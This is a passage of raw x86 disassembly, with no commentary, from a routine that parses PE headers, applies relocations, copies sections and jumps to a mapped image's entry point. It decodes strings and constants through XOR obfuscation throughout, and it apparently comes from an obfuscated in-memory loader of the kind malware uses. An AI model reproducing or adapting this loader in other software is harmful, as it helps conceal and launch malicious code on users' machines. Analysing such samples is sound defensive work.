  425a17:	xor    ecx,esi
  425a19:	lea    ebx,[ebx+eax*1+0x3272ec]
  425a20:	mov    eax,DWORD PTR [ebp+0x10]
  425a23:	mov    eax,DWORD PTR [eax+0x1d8]
  425a29:	add    ecx,edi
  425a2b:	imul   ecx,ebx
  425a2e:	push   ecx
  425a2f:	call   DWORD PTR [eax+0x24]
  425a32:	mov    eax,DWORD PTR [ebp-0x4]
  425a35:	xor    eax,esi
  425a37:	add    eax,edi
  425a39:	cmp    eax,DWORD PTR [ebp-0xc]
  425a3c:	jne    0x425a4d
  425a3e:	mov    eax,DWORD PTR [ebp-0x28]
  425a41:	xor    eax,esi
  425a43:	add    eax,edi
  425a45:	cmp    ebx,eax
  425a47:	jbe    0x4259c7
  425a4d:	mov    eax,DWORD PTR [ebp-0x4]
  425a50:	xor    eax,esi
  425a52:	add    eax,edi
  425a54:	cmp    eax,DWORD PTR [ebp-0xc]
  425a57:	jne    0x425a70
  425a59:	mov    eax,DWORD PTR [ebp-0x8]
  425a5c:	mov    ecx,DWORD PTR [ebp-0x18]
  425a5f:	xor    eax,esi
  425a61:	lea    eax,[ecx+eax*1+0x3272ec]
  425a68:	mov    DWORD PTR [ebp-0x18],eax
  425a6b:	jmp    0x425b5f
  425a70:	mov    DWORD PTR [ebp-0x14],0x1121b28
  425a77:	mov    DWORD PTR [ebp+0xc],0xe042d2e
  425a7e:	mov    ebx,DWORD PTR [ebp-0x4]
  425a81:	xor    ebx,esi
  425a83:	add    ebx,edi
  425a85:	jmp    0x425b4c
  425a8a:	mov    eax,DWORD PTR [ebp-0x4]
  425a8d:	xor    eax,esi
  425a8f:	add    eax,edi
  425a91:	mov    DWORD PTR [ebp-0x14],eax
  425a94:	mov    eax,DWORD PTR [ebp-0x4]
  425a97:	xor    eax,esi
  425a99:	add    eax,edi
  425a9b:	mov    DWORD PTR [ebp+0xc],eax
  425a9e:	mov    ecx,DWORD PTR [ebp-0x4]
  425aa1:	mov    eax,DWORD PTR [ebp-0x24]
  425aa4:	xor    ecx,esi
  425aa6:	add    ecx,edi
  425aa8:	cmp    ecx,eax
  425aaa:	je     0x425ab2
  425aac:	mov    eax,DWORD PTR [eax+ebx*4]
  425aaf:	mov    DWORD PTR [ebp-0x14],eax
  425ab2:	mov    eax,DWORD PTR [ebp-0x1c]
  425ab5:	mov    eax,DWORD PTR [eax+ebx*4]
  425ab8:	mov    DWORD PTR [ebp+0xc],eax
  425abb:	mov    eax,DWORD PTR [ebp-0x4]
  425abe:	mov    ecx,DWORD PTR [ebp-0x14]
  425ac1:	xor    eax,esi
  425ac3:	add    eax,edi
  425ac5:	cmp    eax,ecx
  425ac7:	je     0x425af2
  425ac9:	mov    eax,DWORD PTR [ebp-0x4]
  425acc:	mov    ecx,DWORD PTR [ebp-0x14]
  425acf:	xor    eax,esi
  425ad1:	add    eax,edi
  425ad3:	shr    ecx,0x1f
  425ad6:	cmp    eax,ecx
  425ad8:	je     0x425af2
  425ada:	mov    ecx,DWORD PTR [ebp-0x14]
  425add:	mov    eax,DWORD PTR [ebp+0x10]
  425ae0:	mov    eax,DWORD PTR [eax+0x1d8]
  425ae6:	movzx  ecx,cx
  425ae9:	push   ecx
  425aea:	push   DWORD PTR [ebp-0xc]
  425aed:	call   DWORD PTR [eax+0x8]
  425af0:	jmp    0x425b0b
  425af2:	mov    eax,DWORD PTR [ebp+0xc]
  425af5:	add    eax,DWORD PTR [ebp+0x8]
  425af8:	mov    ecx,DWORD PTR [ebp+0x10]
  425afb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425b01:	add    eax,0x2
  425b04:	push   eax
  425b05:	push   DWORD PTR [ebp-0xc]
  425b08:	call   DWORD PTR [ecx+0x8]
  425b0b:	mov    DWORD PTR [ebp+0xc],eax
  425b0e:	mov    eax,DWORD PTR [ebp-0x4]
  425b11:	mov    ecx,DWORD PTR [ebp+0xc]
  425b14:	xor    eax,esi
  425b16:	add    eax,edi
  425b18:	cmp    eax,ecx
  425b1a:	mov    eax,DWORD PTR [ebp-0x8]
  425b1d:	jne    0x425b30
  425b1f:	mov    ecx,DWORD PTR [ebp-0x18]
  425b22:	xor    eax,esi
  425b24:	lea    eax,[ecx+eax*1+0x3272ec]
  425b2b:	mov    DWORD PTR [ebp-0x18],eax
  425b2e:	jmp    0x425b40
  425b30:	mov    ecx,DWORD PTR [ebp+0xc]
  425b33:	xor    eax,esi
  425b35:	add    eax,edi
  425b37:	imul   eax,ecx
  425b3a:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b3d:	mov    DWORD PTR [ecx+ebx*4],eax
  425b40:	mov    eax,DWORD PTR [ebp-0x8]
  425b43:	xor    eax,esi
  425b45:	lea    ebx,[ebx+eax*1+0x3272ec]
  425b4c:	mov    eax,DWORD PTR [ebp-0x4]
  425b4f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b52:	xor    eax,esi
  425b54:	add    eax,edi
  425b56:	cmp    DWORD PTR [ecx+ebx*4],eax
  425b59:	jne    0x425a8a
  425b5f:	mov    edx,DWORD PTR [ebp-0x10]
  425b62:	mov    ecx,DWORD PTR [ebp-0x2c]
  425b65:	mov    eax,DWORD PTR [ebp-0x18]
  425b68:	sub    edx,0x3272eb
  425b6e:	xor    edx,esi
  425b70:	jmp    0x42593a
  425b75:	mov    ecx,DWORD PTR [ebp-0x4]
  425b78:	xor    ecx,esi
  425b7a:	add    ecx,edi
  425b7c:	cmp    eax,ecx
  425b7e:	mov    eax,DWORD PTR [ebp-0x4]
  425b81:	jne    0x425b8b
  425b83:	mov    eax,DWORD PTR [ebp-0x8]
  425b86:	jmp    0x425b8b
  425b88:	mov    eax,DWORD PTR [ebp-0x4]
  425b8b:	xor    eax,esi
  425b8d:	add    eax,edi
  425b8f:	pop    edi
  425b90:	pop    esi
  425b91:	pop    ebx
  425b92:	leave  
  425b93:	ret    0xc
  425b96:	push   ebp
  425b97:	mov    ebp,esp
  425b99:	sub    esp,0x28
  425b9c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425ba3:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  425baa:	mov    eax,DWORD PTR [ebp+0xc]
  425bad:	mov    DWORD PTR [ebp+0xc],eax
  425bb0:	push   esi
  425bb1:	mov    eax,eax
  425bb3:	mov    eax,DWORD PTR [ebp-0x4]
  425bb6:	mov    esi,DWORD PTR [ebp+0x8]
  425bb9:	mov    ecx,0x75108a4
  425bbe:	xor    eax,ecx
  425bc0:	mov    edx,0x3272ec
  425bc5:	add    eax,edx
  425bc7:	cmp    esi,eax
  425bc9:	je     0x425cf0
  425bcf:	mov    eax,DWORD PTR [ebp+0x8]
  425bd2:	mov    esi,DWORD PTR [ebp+0x8]
  425bd5:	add    esi,DWORD PTR [eax+0x3c]
  425bd8:	push   edi
  425bd9:	mov    DWORD PTR [ebp+0xc],esi
  425bdc:	mov    DWORD PTR [ebp-0x1c],0xf89c85bd
  425be3:	mov    eax,DWORD PTR [ebp-0x1c]
  425be6:	mov    esi,DWORD PTR [ebp-0x4]
  425be9:	mov    edi,DWORD PTR [ebp+0xc]
  425bec:	xor    esi,ecx
  425bee:	xor    eax,ecx
  425bf0:	add    esi,edx
  425bf2:	cmp    DWORD PTR [edi+eax*8+0x19397d8],esi
  425bf9:	je     0x425cea
  425bff:	mov    esi,DWORD PTR [ebp+0xc]
  425c02:	mov    eax,DWORD PTR [ebp+0x8]
  425c05:	add    eax,DWORD PTR [esi+0xa0]
  425c0b:	mov    esi,DWORD PTR [ebp+0x8]
  425c0e:	mov    edi,DWORD PTR [ebp+0xc]
  425c11:	sub    esi,DWORD PTR [edi+0x34]
  425c14:	mov    edi,DWORD PTR [ebp-0x4]
  425c17:	xor    edi,ecx
  425c19:	add    edi,edx
  425c1b:	mov    DWORD PTR [ebp-0x24],esi
  425c1e:	cmp    esi,edi
  425c20:	je     0x425cea
  425c26:	mov    esi,DWORD PTR [ebp-0x4]
  425c29:	xor    esi,ecx
  425c2b:	add    esi,edx
  425c2d:	mov    DWORD PTR [ebp-0x8],esi
  425c30:	push   ebx
  425c31:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  425c38:	jmp    0x425cd4
  425c3d:	mov    esi,DWORD PTR [ebp-0x4]
  425c40:	xor    esi,ecx
  425c42:	lea    edi,[ebx-0x8]
  425c45:	add    esi,edx
  425c47:	shr    edi,1
  425c49:	cmp    esi,edi
  425c4b:	jae    0x425cba
  425c4d:	sub    edi,esi
  425c4f:	lea    ebx,[eax+esi*2+0x8]
  425c53:	mov    DWORD PTR [ebp-0x18],edi
  425c56:	movzx  esi,WORD PTR [ebx]
  425c59:	and    esi,0xfff
  425c5f:	mov    DWORD PTR [ebp-0x14],esi
  425c62:	mov    edi,DWORD PTR [ebp-0x14]
  425c65:	mov    esi,DWORD PTR [eax]
  425c67:	sub    esi,edx
  425c69:	add    edi,esi
  425c6b:	movzx  esi,WORD PTR [ebx]
  425c6e:	shr    esi,0xc
  425c71:	xor    edi,ecx
  425c73:	mov    DWORD PTR [ebp-0x20],edi
  425c76:	mov    DWORD PTR [ebp-0x14],esi
  425c79:	mov    esi,DWORD PTR [ebp-0x20]
  425c7c:	mov    edi,DWORD PTR [ebp+0x8]
  425c7f:	xor    esi,ecx
  425c81:	lea    esi,[esi+edi*1+0x3272ec]
  425c88:	mov    DWORD PTR [ebp-0x20],esi
  425c8b:	mov    esi,DWORD PTR [ebp-0x10]
  425c8e:	mov    edi,DWORD PTR [ebp-0x14]
  425c91:	xor    esi,ecx
  425c93:	add    esi,edx
  425c95:	cmp    edi,esi
  425c97:	jne    0x425caf
  425c99:	mov    esi,DWORD PTR [ebp-0x10]
  425c9c:	mov    edi,DWORD PTR [ebp-0x14]
  425c9f:	xor    esi,ecx
  425ca1:	add    esi,edx
  425ca3:	cmp    edi,esi
  425ca5:	jne    0x425caf
  425ca7:	mov    esi,DWORD PTR [ebp-0x20]
  425caa:	mov    edi,DWORD PTR [ebp-0x24]
  425cad:	add    DWORD PTR [esi],edi
  425caf:	add    ebx,0x2
  425cb2:	dec    DWORD PTR [ebp-0x18]
  425cb5:	jne    0x425c56
  425cb7:	mov    ebx,DWORD PTR [ebp-0xc]
  425cba:	add    DWORD PTR [ebp-0x8],ebx
  425cbd:	mov    esi,DWORD PTR [ebp-0x1c]
  425cc0:	mov    edi,DWORD PTR [ebp-0x8]
  425cc3:	mov    ebx,DWORD PTR [ebp+0xc]
  425cc6:	xor    esi,ecx
  425cc8:	cmp    edi,DWORD PTR [ebx+esi*8+0x19397dc]
  425ccf:	jae    0x425ce9
  425cd1:	add    eax,DWORD PTR [ebp-0xc]
  425cd4:	mov    esi,DWORD PTR [ebp-0x4]
  425cd7:	mov    ebx,DWORD PTR [eax+0x4]
  425cda:	xor    esi,ecx
  425cdc:	add    esi,edx
  425cde:	mov    DWORD PTR [ebp-0xc],ebx
  425ce1:	cmp    ebx,esi
  425ce3:	jne    0x425c3d
  425ce9:	pop    ebx
  425cea:	mov    eax,DWORD PTR [ebp-0x28]
  425ced:	pop    edi
  425cee:	jmp    0x425cf3
  425cf0:	mov    eax,DWORD PTR [ebp-0x4]
  425cf3:	xor    eax,ecx
  425cf5:	add    eax,edx
  425cf7:	pop    esi
  425cf8:	leave  
  425cf9:	ret    0x8
  425cfc:	push   ebp
  425cfd:	mov    ebp,esp
  425cff:	sub    esp,0xd8
  425d05:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425d0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b1
  425d13:	mov    eax,DWORD PTR [ebp-0x4]
  425d16:	push   ebx
  425d17:	push   esi
  425d18:	mov    esi,0x75108a4
  425d1d:	xor    eax,esi
  425d1f:	push   edi
  425d20:	mov    edi,0x3272ec
  425d25:	add    eax,edi
  425d27:	mov    DWORD PTR [ebp-0x18],eax
  425d2a:	mov    eax,DWORD PTR [ebp-0x4]
  425d2d:	xor    eax,esi
  425d2f:	add    eax,edi
  425d31:	mov    DWORD PTR [ebp-0x8],eax
  425d34:	mov    ebx,DWORD PTR [ebp+0x20]
  425d37:	mov    eax,DWORD PTR [ebp-0x1c]
  425d3a:	mov    ecx,DWORD PTR [ebp-0x1c]
  425d3d:	xor    eax,ecx
  425d3f:	mov    DWORD PTR [ebp-0x1c],eax
  425d42:	add    DWORD PTR [ebp-0x1c],0xf89cb5b0
  425d49:	mov    eax,DWORD PTR [ebp-0xc]
  425d4c:	mov    ecx,DWORD PTR [ebp-0xc]
  425d4f:	xor    eax,ecx
  425d51:	mov    DWORD PTR [ebp-0xc],eax
  425d54:	add    DWORD PTR [ebp-0xc],0xf89c85f0
  425d5b:	mov    eax,DWORD PTR [ebp-0x10]
  425d5e:	mov    ecx,DWORD PTR [ebp-0x10]
  425d61:	xor    eax,ecx
  425d63:	mov    DWORD PTR [ebp-0x10],eax
  425d66:	add    DWORD PTR [ebp-0x10],0xf89c85bc
  425d6d:	mov    eax,DWORD PTR [ebp-0x28]
  425d70:	mov    ecx,DWORD PTR [ebp-0x28]
  425d73:	xor    eax,ecx
  425d75:	mov    DWORD PTR [ebp-0x28],eax
  425d78:	add    DWORD PTR [ebp-0x28],0xf89f05b0
  425d7f:	mov    DWORD PTR [ebp+0x20],0xf89cefc5
  425d86:	mov    eax,DWORD PTR [ebp+0x8]
  425d89:	test   eax,eax
  425d8b:	je     0x426216
  425d91:	mov    eax,DWORD PTR [ebp+0xc]
  425d94:	test   eax,eax
  425d96:	je     0x426216
  425d9c:	mov    eax,DWORD PTR [ebp+0x18]
  425d9f:	test   eax,eax
  425da1:	je     0x426216
  425da7:	mov    eax,DWORD PTR [ebp+0x20]
  425daa:	mov    ecx,DWORD PTR [ebp+0x8]
  425dad:	xor    eax,0x8a4
  425db2:	add    eax,0x72ec
  425db7:	cmp    WORD PTR [ecx],ax
  425dba:	jne    0x426216
  425dc0:	mov    eax,DWORD PTR [ebp-0x4]
  425dc3:	xor    eax,esi
  425dc5:	add    eax,edi
  425dc7:	mov    DWORD PTR [ebp-0x30],eax
  425dca:	mov    eax,DWORD PTR [ebp-0x4]
  425dcd:	mov    ecx,DWORD PTR [ebp+0x8]
  425dd0:	mov    eax,DWORD PTR [ebp+0x8]
  425dd3:	add    eax,DWORD PTR [ecx+0x3c]
  425dd6:	mov    DWORD PTR [ebp+0xc],eax
  425dd9:	mov    eax,DWORD PTR [eax+0x50]
  425ddc:	test   eax,eax
  425dde:	je     0x426216
  425de4:	mov    DWORD PTR [ebp-0x2c],0xf88c85b0
  425deb:	mov    eax,DWORD PTR [ebp-0x2c]
  425dee:	xor    eax,esi
  425df0:	add    eax,edi
  425df2:	mov    DWORD PTR [ebp-0x2c],eax
  425df5:	mov    eax,DWORD PTR [ebp-0x4]
  425df8:	mov    eax,DWORD PTR [ebx+0x190]
  425dfe:	mov    ecx,DWORD PTR [eax]
  425e00:	mov    ecx,DWORD PTR [ecx+0x3c]
  425e03:	add    ecx,DWORD PTR [eax]
  425e05:	mov    eax,DWORD PTR [ebp-0x4]
  425e08:	mov    eax,DWORD PTR [ebx+0x18c]
  425e0e:	mov    edx,DWORD PTR [eax]
  425e10:	mov    DWORD PTR [ebp-0x20],ecx
  425e13:	mov    DWORD PTR [ebp+0x20],edx
  425e16:	cmp    edx,edx
  425e18:	jne    0x425e4c
  425e1a:	mov    eax,DWORD PTR [ebx+0x1d8]
  425e20:	lea    edx,[ebp-0x18]
  425e23:	push   edx
  425e24:	mov    edx,DWORD PTR [ebp-0xc]
  425e27:	xor    edx,esi
  425e29:	add    edx,edi
  425e2b:	push   edx
  425e2c:	push   DWORD PTR [ecx+0x50]
  425e2f:	push   DWORD PTR [ebp+0x20]
  425e32:	call   DWORD PTR [eax+0x1c]
  425e35:	mov    eax,DWORD PTR [ebp-0x20]
  425e38:	mov    ecx,DWORD PTR [eax+0x54]
  425e3b:	mov    eax,DWORD PTR [eax+0x50]
  425e3e:	sub    eax,ecx
  425e40:	add    ecx,DWORD PTR [ebp+0x20]
  425e43:	push   ecx
  425e44:	call   0x4267b3
  425e49:	mov    edx,DWORD PTR [ebp+0x20]
  425e4c:	mov    eax,DWORD PTR [ebx+0x194]
  425e52:	mov    DWORD PTR [eax],edx
  425e54:	mov    eax,DWORD PTR [ebp+0xc]
  425e57:	push   DWORD PTR [eax+0x54]
  425e5a:	push   DWORD PTR [ebp+0x8]
  425e5d:	push   edx
  425e5e:	call   0x4266a9
  425e63:	mov    ecx,DWORD PTR [ebp+0x20]
  425e66:	mov    eax,DWORD PTR [ecx+0x3c]
  425e69:	add    eax,ecx
  425e6b:	movzx  ecx,WORD PTR [eax+0x14]
  425e6f:	lea    ecx,[ecx+eax*1+0x18]
  425e73:	mov    DWORD PTR [ebp+0x18],ecx
  425e76:	mov    ecx,DWORD PTR [ebp-0x4]
  425e79:	movzx  edx,WORD PTR [eax+0x6]
  425e7d:	xor    ecx,esi
  425e7f:	add    ecx,edi
  425e81:	mov    DWORD PTR [ebp+0xc],eax
  425e84:	cmp    edx,ecx
  425e86:	je     0x425f33
  425e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  425e8f:	xor    ecx,esi
  425e91:	add    ecx,edi
  425e93:	mov    DWORD PTR [ebp-0x8],ecx
  425e96:	mov    ecx,DWORD PTR [ebp-0x24]
  425e99:	movzx  edx,WORD PTR [eax+0x6]
  425e9d:	xor    ecx,esi
  425e9f:	sub    edx,ecx
  425ea1:	sub    edx,edi
  425ea3:	cmp    DWORD PTR [ebp-0x8],edx
  425ea6:	ja     0x425f33
  425eac:	mov    edx,DWORD PTR [ebp+0x18]
  425eaf:	add    edx,0x8
  425eb2:	mov    DWORD PTR [ebp+0x18],edx
  425eb5:	jmp    0x425eba
  425eb7:	mov    edx,DWORD PTR [ebp+0x18]
  425eba:	mov    eax,DWORD PTR [eax+0x38]
  425ebd:	lea    ecx,[eax-0x1]
  425ec0:	mov    DWORD PTR [ebp-0x38],eax
  425ec3:	mov    eax,DWORD PTR [edx]
  425ec5:	test   eax,ecx
  425ec7:	je     0x425ed0
  425ec9:	not    ecx
  425ecb:	and    eax,ecx
  425ecd:	add    eax,DWORD PTR [ebp-0x38]
  425ed0:	mov    ecx,DWORD PTR [edx+0x4]
  425ed3:	add    ecx,DWORD PTR [ebp+0x20]
  425ed6:	push   ecx
  425ed7:	call   0x4267b3
  425edc:	mov    edx,DWORD PTR [ebp-0x4]
  425edf:	mov    eax,DWORD PTR [ebp+0x18]
  425ee2:	mov    ecx,DWORD PTR [eax+0x8]
  425ee5:	xor    edx,esi
  425ee7:	add    edx,edi
  425ee9:	cmp    ecx,edx
  425eeb:	je     0x425f04
  425eed:	push   ecx
  425eee:	mov    ecx,DWORD PTR [ebp+0x8]
  425ef1:	add    ecx,DWORD PTR [eax+0xc]
  425ef4:	mov    eax,DWORD PTR [eax+0x4]
  425ef7:	add    eax,DWORD PTR [ebp+0x20]
  425efa:	push   ecx
  425efb:	push   eax
  425efc:	call   0x4266a9
  425f01:	mov    eax,DWORD PTR [ebp+0x18]
  425f04:	mov    ecx,DWORD PTR [ebp-0x24]
  425f07:	mov    edx,DWORD PTR [ebp-0x8]
  425f0a:	add    eax,0x28
  425f0d:	xor    ecx,esi
  425f0f:	lea    ecx,[edx+ecx*1+0x3272ec]
  425f16:	mov    edx,DWORD PTR [ebp+0xc]
  425f19:	mov    DWORD PTR [ebp+0x18],eax
  425f1c:	mov    eax,DWORD PTR [ebp-0x24]
  425f1f:	movzx  edx,WORD PTR [edx+0x6]
  425f23:	xor    eax,esi
  425f25:	sub    edx,eax
  425f27:	mov    eax,DWORD PTR [ebp+0xc]
  425f2a:	sub    edx,edi
  425f2c:	mov    DWORD PTR [ebp-0x8],ecx
  425f2f:	cmp    ecx,edx
  425f31:	jbe    0x425eb7
  425f33:	mov    edx,DWORD PTR [ebx+0x18c]
  425f39:	mov    ecx,DWORD PTR [ebp+0x20]
  425f3c:	cmp    ecx,DWORD PTR [edx]
  425f3e:	jne    0x425f67
  425f40:	mov    eax,DWORD PTR [ebx+0x1d8]
  425f46:	lea    edx,[ebp-0x18]
  425f49:	push   edx
  425f4a:	mov    edx,DWORD PTR [ebp-0x10]
  425f4d:	xor    edx,esi
  425f4f:	add    edx,edi
  425f51:	push   edx
  425f52:	mov    edx,DWORD PTR [ebp-0x20]
  425f55:	push   DWORD PTR [edx+0x54]
  425f58:	push   ecx
  425f59:	call   DWORD PTR [eax+0x1c]
  425f5c:	test   eax,eax
  425f5e:	je     0x426207
  425f64:	mov    eax,DWORD PTR [ebp+0xc]
  425f67:	mov    ecx,DWORD PTR [ebx+0x1c8]
  425f6d:	mov    ecx,DWORD PTR [ecx]
  425f6f:	xor    ecx,esi
  425f71:	add    ecx,edi
  425f73:	je     0x426132
  425f79:	mov    eax,DWORD PTR [ebp-0x4]
  425f7c:	xor    eax,esi
  425f7e:	add    eax,edi
  425f80:	and    DWORD PTR [ebp+0x8],0x0
  425f84:	mov    DWORD PTR [ebp-0x14],eax
  425f87:	mov    ecx,0xf89c8524
  425f8c:	mov    eax,0xf89c85dc
  425f91:	mov    DWORD PTR [ebp-0x58],0xf89c8526
  425f98:	mov    DWORD PTR [ebp-0x54],0xf89c852c
  425f9f:	mov    DWORD PTR [ebp-0x50],eax
  425fa2:	mov    DWORD PTR [ebp-0x4c],ecx
  425fa5:	mov    DWORD PTR [ebp-0x48],ecx
  425fa8:	mov    DWORD PTR [ebp-0x44],0xf89c85b0
  425faf:	mov    edx,DWORD PTR [ebp+0x8]
  425fb2:	mov    ecx,0x8a4
  425fb7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  425fbc:	mov    edx,0x72ec
  425fc1:	add    cx,dx
  425fc4:	mov    edx,DWORD PTR [ebp+0x8]
  425fc7:	inc    DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR [ebp+0x8],0x6
  425fce:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  425fd6:	jb     0x425faf
  425fd8:	mov    ecx,0xf89c8522
  425fdd:	mov    DWORD PTR [ebp-0xb0],eax
  425fe3:	mov    DWORD PTR [ebp-0x9c],eax
  425fe9:	mov    DWORD PTR [ebp-0x74],eax
  425fec:	mov    DWORD PTR [ebp-0x70],eax
  425fef:	lea    eax,[ecx+0x1]
  425ff2:	mov    edx,0xf89c85fe
  425ff7:	mov    DWORD PTR [ebp-0x64],eax
  425ffa:	mov    DWORD PTR [ebp-0x60],eax
  425ffd:	mov    DWORD PTR [ebp-0xb4],0xf89c85c4
  426007:	mov    DWORD PTR [ebp-0xac],ecx
  42600d:	mov    DWORD PTR [ebp-0xa8],edx
  426013:	mov    DWORD PTR [ebp-0xa4],0xf89c85d9
  42601d:	mov    DWORD PTR [ebp-0xa0],0xf89c8526
  426027:	mov    DWORD PTR [ebp-0x98],0xf89c85fd
  426031:	mov    DWORD PTR [ebp-0x94],0xf89c8526
  42603b:	mov    DWORD PTR [ebp-0x90],0xf89c852c
  426045:	mov    DWORD PTR [ebp-0x8c],ecx
  42604b:	mov    DWORD PTR [ebp-0x88],0xf89c8529
  426055:	mov    DWORD PTR [ebp-0x84],edx
  42605b:	mov    DWORD PTR [ebp-0x80],0xf89c8527
  426062:	mov    DWORD PTR [ebp-0x7c],ecx
  426065:	mov    DWORD PTR [ebp-0x78],0xf89c85f1
  42606c:	mov    DWORD PTR [ebp-0x6c],ecx
  42606f:	mov    DWORD PTR [ebp-0x68],0xf89c85dd
  426076:	mov    DWORD PTR [ebp-0x5c],0xf89c85b0
  42607d:	xor    eax,eax
  42607f:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  426086:	xor    cl,0xa4
  426089:	sub    cl,0x14
  42608c:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  426093:	inc    eax
  426094:	cmp    eax,0x17
  426097:	jb     0x42607f
  426099:	mov    eax,DWORD PTR [ebx+0x1d8]
  42609f:	lea    ecx,[ebp-0xc0]
  4260a5:	push   ecx
  4260a6:	call   DWORD PTR [eax+0x4]
  4260a9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  4260af:	lea    edx,[ebp-0xd8]
  4260b5:	push   edx
  4260b6:	push   eax
  4260b7:	call   DWORD PTR [ecx+0x8]
  4260ba:	mov    DWORD PTR [ebp-0x40],eax
  4260bd:	lea    eax,[ebp-0x14]
  4260c0:	push   eax
  4260c1:	mov    eax,DWORD PTR [ebx+0x18c]
  4260c7:	push   DWORD PTR [eax]
  4260c9:	mov    eax,DWORD PTR [ebp-0x40]
  4260cc:	call   eax
  4260ce:	mov    eax,DWORD PTR [ebp-0x4]
  4260d1:	xor    eax,esi
  4260d3:	add    eax,edi
  4260d5:	mov    DWORD PTR [ebp-0x34],eax
  4260d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4260db:	mov    eax,DWORD PTR [ebp-0x14]
  4260de:	xor    ecx,esi
  4260e0:	add    ecx,edi
  4260e2:	cmp    eax,ecx
  4260e4:	je     0x42612f
  4260e6:	mov    DWORD PTR [ebp-0x3c],eax
  4260e9:	jmp    0x4260fa
  4260eb:	mov    eax,DWORD PTR [eax]
  4260ed:	mov    ecx,DWORD PTR [ebp-0x3c]
  4260f0:	mov    DWORD PTR [ebp-0x14],eax
  4260f3:	mov    eax,DWORD PTR [ebp-0x14]
  4260f6:	cmp    eax,ecx
  4260f8:	je     0x426107
  4260fa:	mov    edx,DWORD PTR [eax+0x18]
  4260fd:	mov    ecx,DWORD PTR [ebx+0x18c]
  426103:	cmp    edx,DWORD PTR [ecx]
  426105:	jne    0x4260eb
  426107:	mov    ecx,DWORD PTR [ebx+0x18c]
  42610d:	mov    edx,DWORD PTR [eax+0x18]
  426110:	cmp    edx,DWORD PTR [ecx]
  426112:	jne    0x42612f
  426114:	mov    ecx,DWORD PTR [ebx+0x190]
  42611a:	mov    edx,DWORD PTR [ebp-0x20]
  42611d:	mov    edx,DWORD PTR [edx+0x28]
  426120:	add    edx,DWORD PTR [ecx]
  426122:	mov    DWORD PTR [eax+0x1c],edx
  426125:	mov    eax,DWORD PTR [ebp-0x24]
  426128:	xor    eax,esi
  42612a:	add    eax,edi
  42612c:	mov    DWORD PTR [ebp-0x34],eax
  42612f:	mov    eax,DWORD PTR [ebp+0xc]
  426132:	push   ebx
  426133:	push   eax
  426134:	push   DWORD PTR [ebp+0x20]
  426137:	call   0x4258b3
  42613c:	test   eax,eax
  42613e:	je     0x426207
  426144:	push   DWORD PTR [ebp+0xc]
  426147:	mov    ecx,ebx
  426149:	push   DWORD PTR [ebp+0x20]
  42614c:	call   0x42580c
  426151:	test   eax,eax
  426153:	je     0x426207
  426159:	mov    eax,DWORD PTR [ebp+0xc]
  42615c:	mov    edx,DWORD PTR [ebp+0x20]
  42615f:	mov    ecx,ebx
  426161:	call   0x4256e5
  426166:	test   eax,eax
  426168:	je     0x426207
  42616e:	push   ebx
  42616f:	push   DWORD PTR [ebp+0x20]
  426172:	call   0x425b96
  426177:	test   eax,eax
  426179:	je     0x426207
  42617f:	mov    eax,DWORD PTR [ebx+0x18c]
  426185:	mov    edx,DWORD PTR [ebp+0x20]
  426188:	cmp    edx,DWORD PTR [eax]
  42618a:	jne    0x4261a6
  42618c:	mov    eax,DWORD PTR [ebx+0x1d8]
  426192:	lea    ecx,[ebp-0x18]
  426195:	push   ecx
  426196:	push   DWORD PTR [ebp-0x18]
  426199:	mov    ecx,DWORD PTR [ebp-0x20]
  42619c:	push   DWORD PTR [ecx+0x54]
  42619f:	push   edx
  4261a0:	call   DWORD PTR [eax+0x1c]
  4261a3:	mov    edx,DWORD PTR [ebp+0x20]
  4261a6:	mov    eax,DWORD PTR [ebx+0x1c8]
  4261ac:	mov    eax,DWORD PTR [eax]
  4261ae:	xor    eax,esi
  4261b0:	add    eax,edi
  4261b2:	je     0x4261eb
  4261b4:	mov    ecx,DWORD PTR [ebp+0xc]
  4261b7:	mov    eax,DWORD PTR [ecx+0x28]
  4261ba:	mov    DWORD PTR [ebp+0x8],0xf89ca5b0
  4261c1:	mov    esi,DWORD PTR [ebp+0x8]
  4261c4:	push   DWORD PTR [ebp+0x14]
  4261c7:	xor    esi,0x8a4
  4261cd:	push   DWORD PTR [ebp+0x10]
  4261d0:	add    esi,0x72ec
  4261d6:	or     WORD PTR [ecx+0x16],si
  4261da:	add    eax,edx
  4261dc:	push   edx
  4261dd:	call   eax
  4261df:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b1
  4261e9:	jmp    0x4261f5
  4261eb:	mov    eax,DWORD PTR [ebp+0xc]
  4261ee:	mov    eax,DWORD PTR [eax+0x28]
  4261f1:	add    eax,edx
  4261f3:	call   eax
  4261f5:	mov    DWORD PTR [ebp-0x8],eax
  4261f8:	mov    eax,DWORD PTR [ebp-0x8]
  4261fb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4261fe:	mov    DWORD PTR [ecx],eax
  426200:	mov    DWORD PTR [ebp-0x30],0x1
  426207:	cmp    DWORD PTR [ebp-0x30],0x0
  42620b:	jne    0x426211
  42620d:	and    DWORD PTR [ebp+0x20],0x0
  426211:	mov    eax,DWORD PTR [ebp+0x20]
  426214:	jmp    0x426218
  426216:	xor    eax,eax
  426218:	pop    edi
  426219:	pop    esi
  42621a:	pop    ebx
  42621b:	leave  
  42621c:	ret    0x1c
  42621f:	push   ebp
  426220:	mov    ebp,esp
  426222:	movzx  edx,WORD PTR [ecx+0x6]
  426226:	movzx  eax,WORD PTR [ecx+0x14]
  42622a:	push   ebx
  42622b:	push   edi
  42622c:	xor    edi,edi
  42622e:	lea    eax,[eax+ecx*1+0x18]
  426232:	test   edx,edx
  426234:	je     0x426255
  426236:	mov    ecx,DWORD PTR [eax+0xc]
  426239:	lea    ebx,[ecx+esi*1]
